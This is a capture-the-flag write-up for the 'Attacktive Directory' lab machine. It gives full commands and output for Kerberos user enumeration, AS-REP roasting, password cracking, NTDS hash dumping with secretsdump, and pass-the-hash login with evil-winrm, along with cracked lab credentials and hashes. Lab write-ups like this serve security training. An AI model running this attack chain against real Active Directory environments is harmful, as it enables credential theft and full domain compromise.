# Machine Name: Attacktive Directory  
# Machine IP: 10.113.151.200  
# Type: Medium Windows    
   
Questions:  
* What tool will allow us to enumerate port 139/445?  
-> enum4linux  
```bash
enum4linux is an automation tool used to extract detailed information from Windows and Samba systems via the SMB protocol.  
It is primarily used during the enumeration phase of a penetration test to discover user lists, share names, group memberships, and password policies.    
By wrapping multiple low-level tools into one script, it provides a comprehensive "scout report" of a target's internal network configuration.  
```

----
To find the answer of next questions, I made a port scan by using "rustscan" and then, chect the services of the open ports:  
```bash
rustscan -a 10.113.151.200
```
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ nmap -Pn -p53,88,80,135,139,593,636,3268,3269,3389,5985,9389 10.113.151.200 -sV -sC
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-23 00:13 +0400
Nmap scan report for 10.113.151.200
Host is up (0.099s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-22 20:13:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-04-22T20:13:58+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-04-22T20:13:47+00:00
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-04-21T20:05:56
|_Not valid after:  2026-10-21T20:05:56
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: ERROR: Script execution failed (use -d to debug)
|_smb2-security-mode: SMB: Couldn't find a NetBIOS name that works for the server. Sorry!

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.43 seconds
                                                                                
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ 
```

* What is the NetBIOS-Domain Name of the machine?  
-> THM-AD  
* What invalid TLD do people commonly use for their Active Directory Domain?  
-> .local  
Do not forget to add "spookysec.local" domain into /etc/hosts file.  

----
enum4linux didn't give important info about the target. (enum4linux -a 10.113.151.200)   
So, we will look at the CTF description. I can easily see that there is a password and username files. We can use them with kerbrute tool.  
```bash
kerbrute userenum -d spookysec.local --dc 10.113.151.200 usernames.txt
``` 
* Kerbrute:  
It is the name of the program that I used. It is written in Go language and very fast. In Active Directory environment, it is used for finding the usernames, check passwords (bruteforce) or "Password Spraying" attacks.    
It uses UDP over port 88 and this makes it much faster. It is so quite and seem as "Logon Failure" in Windows Event Log much time. We usually use it to find usernames and then check passwords.  
* userenum:  
It is a sub-command function under the kerbrute program. It sends all the usernames that I assigned to the Kerberos Server (KDC) and asks if there is a user like this.    
If the server says "yeah, but your password is wrong = Pre-Authentication is required" , it means username is true.  
* -d spookysec.local  
Domain name   
* --dc 10.113.151.200  
--dc flag means "Domain Controller" and This Ip is the Ip address of the target server. Keybrute communicate with the KDC service over the port 88 that is open in this IP.    
  
The Output is:  
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ kerbrute userenum -d spookysec.local --dc 10.113.151.200 usernames.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/23/26 - Ronnie Flathers @ropnop

2026/04/23 00:27:32 >  Using KDC(s):
2026/04/23 00:27:32 >  	10.113.151.200:88

2026/04/23 00:27:33 >  [+] VALID USERNAME:	 james@spookysec.local
2026/04/23 00:27:34 >  [+] VALID USERNAME:	 svc-admin@spookysec.local
2026/04/23 00:27:35 >  [+] VALID USERNAME:	 James@spookysec.local
2026/04/23 00:27:36 >  [+] VALID USERNAME:	 robin@spookysec.local
2026/04/23 00:27:41 >  [+] VALID USERNAME:	 darkstar@spookysec.local
2026/04/23 00:27:45 >  [+] VALID USERNAME:	 administrator@spookysec.local
2026/04/23 00:27:52 >  [+] VALID USERNAME:	 backup@spookysec.local
2026/04/23 00:27:55 >  [+] VALID USERNAME:	 paradox@spookysec.local
2026/04/23 00:28:18 >  [+] VALID USERNAME:	 JAMES@spookysec.local
2026/04/23 00:28:26 >  [+] VALID USERNAME:	 Robin@spookysec.local
2026/04/23 00:29:26 >  [+] VALID USERNAME:	 Administrator@spookysec.local
2026/04/23 00:31:14 >  [+] VALID USERNAME:	 Darkstar@spookysec.local
2026/04/23 00:31:53 >  [+] VALID USERNAME:	 Paradox@spookysec.local
2026/04/23 00:34:01 >  [+] VALID USERNAME:	 DARKSTAR@spookysec.local
2026/04/23 00:34:42 >  [+] VALID USERNAME:	 ori@spookysec.local
2026/04/23 00:35:49 >  [+] VALID USERNAME:	 ROBIN@spookysec.local
2026/04/23 00:38:33 >  Done! Tested 73317 usernames (16 valid) in 661.028 seconds
                                
```
The most suspicious usernames are "svc-admin" and "backup" which are also the answer of the next questions:  
* What notable account is discovered? (These should jump out at you)  
* What is the other notable account is discovered? (These should jump out at you)  

----
We have two user accounts that we could potentially query a ticket from.   
  
* Which user account can you query a ticket from with no password?  
  
In this task, it says that we can get the ticket of the users without needing their passwords. This attack is called "AS-REP Roasting" attack and uses GetNPUsers.py for obtaining the ticket.   
The command is:   

```bash

impacket-GetNPUsers spookysec.local/ -usersfile valid_usernames.txt -format hashcat -dc-ip 10.113.151.200

```

* Impacket   
Impacket is a collection of Python classes used for working with network protocols. It allows ethical hackers to interact with Windows systems and Active Directory by "talking" directly to protocols like SMB, MSRPC, and Kerberos. In simple terms, it is a versatile "Swiss Army knife" for network exploitation.   
  
* spookysec.local/  
It means that " go to this domain and implement the attack in there   
  
* -usersfile valid_usernames.txt   
It means use these usernames one by one. It contains the 8 names that we have found by using keybrute:   

```bash

┌──(faridd㉿Ferid)-[~/Downloads]

└─$ cat valid_usernames.txt 

james
svc-admin
robin
darkstar
administrator
backup
paradox
ori
```

* -dc-ip 10.113.151.200  
Our tool will communicate directy with Domain Controller over this IP  
   
* -format hashcat  
If it found the hash of a user, it will convert into a format that or hash-cracker tools can crack it.   

The output is:    
```bash
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1f81b32f72b73940773bdaded602ce2e$8caac9e94658ef1d705b9fc4ed6ab083beb209d8501eb2033d2ecf7015238206a1e83fda57170ccf47a9d01ead5dc8ba37b4d8a216cbd9ec87847e9026b41f331a9445383a1ff65eec1aa46740e06fee17a42f731a2fbe8aba45eecb3bbf92d7f7292ef9ac314ee00642b52954f3a20578ad62c626149bc3fb6f8260dd392e39649f1d70cb3b99cc69f2ffb93c25a6494c19357b4e5e1fb511aab57ad0565f4a1f185e08f5ea31de8e731dc9688732433c4e130b239735292dea470a832a559b3982c4c10c5b0d557a7d07f644b16a928da4d1b68b2772bfeb50a6f4bb6e4bea40da4cc178fb75729bafc81148b9ab9249b7
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ori doesn't have UF_DONT_REQUIRE_PREAUTH set
```
Lets crack it.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ echo '$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1f81b32f72b73940773bdaded602ce2e$8caac9e94658ef1d705b9fc4ed6ab083beb209d8501eb2033d2ecf7015238206a1e83fda57170ccf47a9d01ead5dc8ba37b4d8a216cbd9ec87847e9026b41f331a9445383a1ff65eec1aa46740e06fee17a42f731a2fbe8aba45eecb3bbf92d7f7292ef9ac314ee00642b52954f3a20578ad62c626149bc3fb6f8260dd392e39649f1d70cb3b99cc69f2ffb93c25a6494c19357b4e5e1fb511aab57ad0565f4a1f185e08f5ea31de8e731dc9688732433c4e130b239735292dea470a832a559b3982c4c10c5b0d557a7d07f644b16a928da4d1b68b2772bfeb50a6f4bb6e4bea40da4cc178fb75729bafc81148b9ab9249b7' > hash.txt
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 24 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:01 DONE (2026-04-23 00:55) 0.5405g/s 3161Kp/s 3161Kc/s 3161KC/s manaia05..mama004
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ 
```
Our password is "management2005" for "svc-admin" user.   
Let's answer remaining questions:   
* We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?   
-> svc-admin (It was shown at the output of Impacket)   
* Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)  
-> Kerberos 5 AS-REP etype 17/18/23 (It is shown at John output  
* What mode is the hash?    
-> 18200 (We can learn it by searching on google "$krb5asrep$23$ hash mode"  
* Now crack the hash with the modified password list provided, what is the user accounts password?  
-> management2005  

----
Now, we have a user "src-admin" and it password "management2005". Let's use it on Smbclient:   
```bash
smbclient -L //10.113.151.200/ -U 'spookysec.local\svc-admin%management2005'
```
The Output is:
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.151.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
We can access "backup" folder.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ smbclient -L //10.113.151.200/ -U 'spookysec.local\svc-admin%management2005'


	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backup          Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.113.151.200 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
                                                                                                                                                                                                                                              
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ smbclient //10.113.151.200/backup -U 'spookysec.local\svc-admin%management2005' 

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Apr  4 23:08:39 2020
  ..                                  D        0  Sat Apr  4 23:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 23:08:53 2020

		8247551 blocks of size 4096. 3750634 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> !cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYwsmb: \>
```
We saw an encoded string in there lets decode it via base64.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ echo 'YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw' | base64 -d
backup@spookysec.local:backup2517860
```
Yeahh, we already have another username and password. To gain higher privileges, I used secretsdump.py from Impacket to dump password hashes from the domain controller.      
This technique exploited the DRSUAPI method to dump NTDS.dit database remotely. I obtained the NTLM hash of the Administrator account.    
With this hash, I performed a Pass-the-Hash (PtH) attack using Evil-WinRM to gain an administrative session:     
```bash
impacket-secretsdump -just-dc-ntlm spookysec.local/backup:<password>@10.113.151.200
```
* impacket-secretsdump  
This is the tool from the Impacket suite. Its primary job is to extract secrets (passwords, hashes, keys) from remote machines. In this context, it uses the DRSUAPI protocol to pull data from the Active Directory database.  
  
* -just-dc-ntlm  
This is a filter flag. It tells the tool: "Only show me the NTLM hashes of the domain users." Without this, the output would be flooded with extra technical data (like Kerberos keys or cleartext passwords if available). It keeps your terminal clean so you can easily find the Administrator hash.  

* spookysec.local/  
This specifies the Target Domain. Active Directory needs to know which domain you are trying to authenticate to.  

* backup:<password>@10.113.151.200  
The credentials and target IP.  

```bash
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:8cd2f24b9926910c17322833af9d019b:::
[*] Cleaning up... 
```

Bingoo!!!. We can be Administrator right now. After this, can get all the flags from the user's accounts. Because Admin has access to them as well. I will just use Evil-Winrm tool for it.   
```bash
┌──(faridd㉿Ferid)-[~/Downloads]
└─$ evil-winrm -i 10.113.151.200 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```
We got it !!     
Just look at these folders for the flags of last three questions:  
* C:\Users\Administrator\Desktop  
* C:\Users\svc-admin\Desktop  
* C:\Users\backup\Desktop  













































